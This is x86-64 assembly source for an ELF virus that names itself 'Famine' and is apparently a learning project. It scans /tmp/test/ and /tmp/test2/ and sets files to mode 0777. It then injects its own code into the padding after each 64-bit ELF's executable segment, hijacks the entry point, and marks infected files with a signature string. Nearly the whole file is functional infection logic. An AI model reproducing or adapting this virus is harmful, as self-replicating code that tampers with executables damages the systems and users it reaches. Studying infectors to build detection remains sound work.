global _start
section .text

%define data(x) [(rbp - data_size) + data.%+x]
%define TRUE    1
%define FALSE   0

%macro log 2
%ifdef DEBUG
    push rax
    push rdi
    push rsi
    push rdx
    push r11

    mov rax, SYS_WRITE
    mov rdi, STDERR_FILENO
    mov rsi, %1
    mov rdx, %2
    syscall

    pop r11
    pop rdx
    pop rsi
    pop rdi
    pop rax
%endif
%endmacro

STUB_SIZE:      equ (_end - _start)
DIRENT_ARR_SIZE:    equ 1024

; syscalls
SYS_READ:       equ 0
SYS_WRITE:      equ 1
SYS_OPEN:       equ 2
SYS_CLOSE:      equ 3
SYS_FSTAT:      equ 5
SYS_LSEEK:      equ 8
SYS_MMAP:       equ 9
SYS_MPROTECT:   equ 10
SYS_MUNMAP:     equ 11
SYS_EXIT:       equ 60
SYS_GETDENTS:   equ 78
SYS_CHMOD:      equ 90

; file descriptors
STDOUT_FILENO:  equ 1
STDERR_FILENO:  equ 2

; open flags
O_RDONLY:       equ 0
O_WRONLY:       equ 1
O_RDWR:         equ 2
O_DIRECTORY:    equ 65536

; m{map,protect} flags
MAP_SHARED:     equ 0x01
MAP_PRIVATE:    equ 0x02
PROT_READ:      equ 0x01
PROT_WRITE:     equ 0x02
PROT_EXEC:      equ 0x04
MAP_ERROR:      equ -4095

; lseek flags
SEEK_SET:   equ 0
SEEK_CUR:   equ 1
SEEK_END:   equ 2

; ELF
; e_ident (size of e_ident)
EI_NIDENT:      equ 16

ELF64_E_IDENT_LSB:          equ 0x00010102464c457f
ELF64_E_IDENT_MSB_ET_DYN:   equ 0x00000001003e0003
ELF64_E_IDENT_MSB_ET_EXEC:  equ 0x00000001003e0002
ELF64_EXECUTABLE_SEGMENT:   equ 0x0000000500000001

; e_type
ET_NONE:    equ 0
ET_REL:     equ 1
ET_EXEC:    equ 2
ET_DYN:     equ 3
ET_CORE:    equ 4
ET_NUM:     equ 5

struc	stat
    .st_dev			resq	1
    .__pad1			resw	1
    .st_ino			resq	1
    .st_mode		resd	1
    .st_nlink		resq	1
    .st_uid			resd	1
    .st_gid			resd	1
    .st_rdev		resq	1
    .__pad2			resw	1
    .st_size		resq	1
    .st_blksize		resq	1
    .st_blocks		resq	1
    .st_atim		resq	2
    .st_mtim		resq	2
    .st_ctim		resq	2
    .__unused		resq	3
endstruc

struc Elf64_Ehdr
    .e_ident        resb EI_NIDENT
    .e_type         resw 1
    .e_machine      resw 1
    .e_version      resd 1
    .e_entry        resq 1
    .e_phoff        resq 1
    .e_shoff        resq 1
    .e_flags        resd 1
    .e_ehsize       resw 1
    .e_phentsize    resw 1
    .e_phnum        resw 1
    .e_shentsize    resw 1
    .e_shnum        resw 1
    .e_shstrndx     resw 1
endstruc

struc	Elf64_Phdr
    .p_type			resd	1
    .p_flags		resd	1
    .p_offset		resq	1
    .p_vaddr		resq	1
    .p_paddr		resq	1
    .p_filesz		resq	1
    .p_memsz		resq	1
    .p_align		resq	1
endstruc

struc Elf64_Shdr
    .sh_name        resd 1
    .sh_type        resd 1
    .sh_flags       resq 1
    .sh_addr        resq 1
    .sh_offset      resq 1
    .sh_size        resq 1
    .sh_link        resw 1
    .sh_info        resw 1
    .sh_addralign   resq 1
    .sh_entsize     resq 1
endstruc

; dirent
; d_type
DT_REG: equ 8

struc	dirent
    .d_ino:			resq	1
    .d_off:			resq	1
    .d_reclen		resw	1
    ; char d_name[] - flexible array member, size can be calculated from d_reclen
    .d_name			resb	1
    ; pad
    ; d_type (dirent + d_reclen - 1)
endstruc

struc data
    .base_address   resq 1
    .dirent_array   resb DIRENT_ARR_SIZE
    .dir_fd         resq 1
    .file_path      resb 1024
    .host_fd        resq 1
    .stat           resb stat_size
    .host_size      resq 1
    .host_bytes     resq 1
endstruc

_start:
    push rdi
    push rsi
    push rcx
    push rdx

    push rbp
    mov rbp, rsp
    ; NASM automatically creates a <name>_size constant for strucs
    sub rbp, data_size

    call get_base_address
    push rax

    lea r15, [rel infect_directories]
    .open_directory:
        .loop_condition:
            mov rdi, [r15]
            test rdi, rdi
            jz _host

        mov r14, rdi

        mov rsi, O_DIRECTORY | O_RDONLY
        lea rdx, [rel .close_directory]
        xor rcx, rcx
        call try_open

        mov data(dir_fd), rax

        log directory_msg, 4
    .read_directory:
        log read_directory_msg, 15

        mov rdx, DIRENT_ARR_SIZE
        lea rsi, data(dirent_array)
        mov rdi, data(dir_fd)
        mov rax, SYS_GETDENTS
        syscall
        test rax, rax
        jle .close_directory

        xor r13, r13 ; offset counter for directory entries
        mov r12, rax ; number of bytes read by getdents
    .process_file:
        log file_msg, 5

        lea rdi, data(dirent_array)
        add rdi, r13
        ; d_type is the last field in the dirent struct, which has
        ; a variable length due to the d_name field
        movzx edx, WORD [rdi + dirent.d_reclen]
        mov al, BYTE [rdi + rdx - 1]
        ; store address of file currently being processed
        add rdi, dirent.d_name
        add r13, rdx
        cmp al, DT_REG
        jne .next_file

        mov rsi, rdi
        mov rdi, r14
        call try_infect
    .next_file:
        cmp r13, r12
        jl .process_file
        jmp .read_directory
    .close_directory:
        log close_msg, 6

        mov rdi, data(dir_fd)
        mov rax, SYS_CLOSE
        syscall
    .next_directory:
        add r15, 8
        jmp .loop_condition

    add rsp, data_size
    pop rbp

    pop rax
    pop rdx
    pop rcx
    pop rsi
    pop rdi
    jmp rax

; void try_infect(rdi=char*, rsi=char*)
try_infect:
    log infect_msg, 7

    mov rax, rsi
    mov rsi, rdi
    lea rdi, data(file_path)
    call get_full_path

    mov rdi, rdx
    mov rsi, 0o777
    mov rax, SYS_CHMOD
    syscall
    test rax, rax
    jl exit

    mov rsi, O_RDWR
    xor rdx, rdx
    lea rcx, [rel .return]
    call try_open

    mov data(host_fd), rax

    lea rsi, data(stat)
    mov rdi, rax
    mov rax, SYS_FSTAT
    syscall
    cmp rax, 0
    jnz .close

    mov rsi, QWORD data(stat + stat.st_size)
    mov data(host_size), rsi
    cmp rsi, Elf64_Ehdr_size + Elf64_Phdr_size + STUB_SIZE
    jl .close

    mov rdi, rsi
    mov rsi, .close
    call try_map_host
    mov data(host_bytes), rax
    mov rdi, rax

    call is_elf64
    cmp rax, TRUE
    jne .unmap

    call do_infect

    .unmap:
        mov rsi, data(host_size)
        mov rdi, data(host_bytes)
        mov rax, SYS_MUNMAP
        syscall
    .close:
        mov rdi, data(host_fd)
        mov rax, SYS_CLOSE
        syscall
    .return:
        ret

is_elf64:
    xor rax, rax
    cmp QWORD [rdi + 8], rax
    jnz .return
    mov rdx, ELF64_E_IDENT_LSB
    cmp QWORD [rdi], rdx
    jz .continue
   .continue:
        mov rdx, ELF64_E_IDENT_MSB_ET_DYN
        cmp QWORD [rdi + 16], rdx
        jz .true
        mov rdx, ELF64_E_IDENT_MSB_ET_EXEC
        cmp QWORD [rdi + 16], rdx
        jnz .return
    .true:
        mov rax, TRUE
    .return:
        ret

do_infect:
    log do_infect_msg, 10

    push r13
    push r14
    push r15

    mov r15, rdi
    call find_executable_segment
    test rax, rax
    jz .return
    mov r14, rax

    call find_space
    test rdi, rdi
    jz .return

    mov rcx, STUB_SIZE
    repnz movsb

    mov rax, QWORD [r15 + Elf64_Ehdr.e_entry]
    mov QWORD [rdi - 16], r13
    mov QWORD [rdi - 8], rax

    mov QWORD [r15 + Elf64_Ehdr.e_entry], r13
    mov rax, STUB_SIZE
    add QWORD [r14 + Elf64_Phdr.p_filesz], rax
    add QWORD [r14 + Elf64_Phdr.p_memsz], rax
    .return:
        pop r15
        pop r14
        pop r13
        ret

; (rax=Elf64_Phdr*/NULL, rdx=entrypoint_vaddr, r13=segment_end_vaddr) find_executable_segment(rdi=Elf64_Ehdr*)
find_executable_segment:
    log find_executable_segment_msg, 24
    push rcx
    push rdi

    mov rdx, QWORD [r15 + Elf64_Ehdr.e_entry]
    movzx rcx, WORD [r15 + Elf64_Ehdr.e_phnum]
    mov rax, QWORD [r15 + Elf64_Ehdr.e_phoff]
    lea rdi, [r15 + rax]
    .check_segment:
        test rcx, rcx
        jz .not_found

        mov rax, ELF64_EXECUTABLE_SEGMENT
        cmp rax, QWORD [rdi]
        jnz .next_segment

        mov rax, QWORD [rdi + Elf64_Phdr.p_vaddr]
        cmp rdx, rax
        jb .next_segment

        add rax, QWORD [rdi + Elf64_Phdr.p_memsz]
        cmp rdx, rax
        jb .found_segment
    .next_segment:
        add rdi, Elf64_Phdr_size
        dec rcx
        jmp .check_segment
    .not_found:
        xor rax, rax
        jmp .return
    .found_segment:
        mov rax, rdi
    .return:
        pop rdi
        pop rcx
        ret

; size_t find_space(r15=Elf64_Ehdr*, r14=Elf64_Phdr*)
find_space:
    log find_space_msg, 11
    push rax
    push rcx
    push rsi

    mov rax, QWORD [r14 + Elf64_Phdr.p_offset]
    add rax, QWORD [r14 + Elf64_Phdr.p_filesz]
    lea rdi, [r15 + rax]

    mov rsi, rdi
    xor rax, rax
    mov rcx, STUB_SIZE
    repz scasb
    test rcx, rcx
    ja .no_space

    mov rax, [rel signature]
    cmp rax, QWORD [rsi - (_end - signature)]
    jz .already_infected
    mov rdi, rsi
    jmp .return
    .no_space:
    .already_infected:
        xor rdi, rdi
    .return:
        pop rsi
        pop rcx
        pop rax
        ret

; void *try_map_host(rdi=len, rsi=callback)
try_map_host:
    push rsi
    mov rsi, rdi
    xor r9, r9
    mov r8, data(host_fd)
    mov r10, MAP_SHARED
    mov rdx, PROT_READ | PROT_WRITE
    xor rdi, rdi
    mov rax, SYS_MMAP
    syscall

    pop rsi
    cmp rax, MAP_ERROR
    jae .error
    ret
    .error:
        jmp rsi

; void *get_base_address()
; Gets the base address of the running process.
get_base_address:
    lea rax, [rel _start]
    mov rdx, [rel virus_entrypoint]
    sub rax, rdx
    add rax, [rel host_entrypoint]
    ret

; void get_full_path(rdi=char*, rsi=char*)
; Appends the file name (rsi) to the directory name (rdi).
get_full_path:
    mov rdx, rdi
    .directory_name:
        movsb
        cmp BYTE [rsi], 0
        jnz .directory_name
        mov rsi, rax
    .file_name:
        movsb
        cmp BYTE [rsi - 1], 0
        jnz .file_name
    ret

; int try_open(rdi=char*, rsi=flags, rdx=mode, rcx=callback)
; Attempts to open rdi with the flags and mode set in rsi
; and rdx, jmps to callback in case of failure.
try_open:
    mov rax, SYS_OPEN
    syscall
    test rax, rax
    jl .error
    ret
    .error:
        jmp rcx

exit:
    mov rax, SYS_EXIT
    xor rdi, rdi
    syscall

infect_directories:
    dq tmp_test, tmp_test2, 0
tmp_test:
    db "/tmp/test/", 0
tmp_test2:
    db "/tmp/test2/", 0
proc_self_maps:
    db "/proc/self/maps", 0
not_64_bit_msg:
    db "Not a 64 bit ELF", 10
not_elf_msg:
    db "Not an ELF", 10
file_path:
    db "Famine", 0
signature:
    db "abied-ch:ef082ac137069c1ef08f0a6d54ea4d2f4e180fb2769b9bb9f137cc5f98f5f4fe", 0
infect_msg:
    db "infect", 10
virus_entrypoint:
    dq _start
host_entrypoint:
    dq _host
directory_msg:
    db "dir", 10
host_msg:
    db "host", 10
file_msg:
    db "file", 10
close_msg:
    db "close", 10
do_infect_msg:
    db "do_infect", 10
try_infect_msg:
    db "try_infect", 10
read_directory_msg:
    db "read_directory", 10
find_space_msg:
    db "find_space", 10
find_executable_segment_msg:
    db "find_executable_segment", 10

_end:

_host:
    push rax
    push rdi
    push rsi
    push rdx
    log host_msg, 5
    pop rdx
    pop rsi
    pop rdi
    pop rax
    jmp exit
